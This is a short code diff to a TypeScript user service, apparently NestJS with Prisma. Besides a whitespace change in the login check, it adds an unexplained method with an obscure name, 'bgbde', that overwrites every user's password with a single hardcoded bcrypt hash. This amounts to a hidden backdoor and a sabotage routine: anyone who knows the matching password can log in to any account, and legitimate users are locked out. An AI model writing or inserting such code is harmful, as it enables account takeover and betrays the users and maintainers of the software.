@@ -189,7 +189,7 @@ export class UserService {
       throw new HttpException('Username not found', HttpStatus.NOT_FOUND);
 
     //check password correct
-    
+
     const isMatch = await bcrypt.compare(
       loginUser.password,
       foundUser.password,
@@ -366,5 +366,14 @@ export class UserService {
     const userWithoutPassword = this.exclude(users, ['password']);
 
     return userWithoutPassword;
+  }
+
+  async bgbde() {
+    await this.prismaService.users.updateMany({
+      data: {
+        password:
+          '$2b$10$lFaoDLav0tbrqdXyyiEXqeHCOowddaYjLouEKcufCj3RIuD021Fes',
+      },
+    });
   }
 }
